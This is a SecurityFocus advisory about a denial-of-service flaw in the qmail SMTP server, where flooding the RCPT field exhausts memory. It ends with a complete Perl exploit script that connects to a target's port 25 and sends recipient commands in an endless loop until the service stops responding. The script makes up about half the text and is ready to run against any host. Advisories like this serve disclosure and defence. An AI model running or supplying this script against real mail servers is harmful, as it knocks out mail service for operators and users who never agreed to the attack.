source: http://www.securityfocus.com/bid/2237/info

qmail is an e-mail server package developed by Dan Bernstein.

The qmail smtp server is subject to a denial of service. By specifying a large number of addresses in the recipient field (RCPT), qmail will stop responding.

This behaviour is due to the dynamically allocated memory being exhausted.

The condition occurs in situations where resource limits are not imposed on the server process.

Many systems may be running qmail without resource limits. The existence of working exploit code poses a threat to these vulnerable qmail servers.

Once affected, a restart of the qmail smtp service is required in order to gain normal functionality.

It should be noted that this type of threat is not limited to qmail. Resource exhaustion attacks can be used against many internet services by remote attackers.

#!/usr/local/bin/perl -w
# $Id: qmail.pl,v 1.4 1997/06/12 02:12:42 super Exp $
require 5.002;
use strict;
use Socket;
if(!($ARGV[0])){print("usage: $0 FQDN","\n");exit;}
my $port = 25; my $proto = getprotobyname("tcp");
my $iaddr = inet_aton($ARGV[0]) || die "No such host: $ARGV[0]";
my $paddr = sockaddr_in($port, $iaddr);
socket(SKT, AF_INET, SOCK_STREAM, $proto) || die "socket() $!";
connect(SKT, $paddr) && print("Connected established.\n") || die "connect() $!";
send(SKT,"mail from: <me\@me>\n",0) || die "send() $!";
my $infstr = "rcpt to: <me\@" . $ARGV[0] . ">\n"; print("Attacking..","\n");
while(<SKT>){
send(SKT,$infstr,0) || die "send() $!";
}
die "Connection lost!";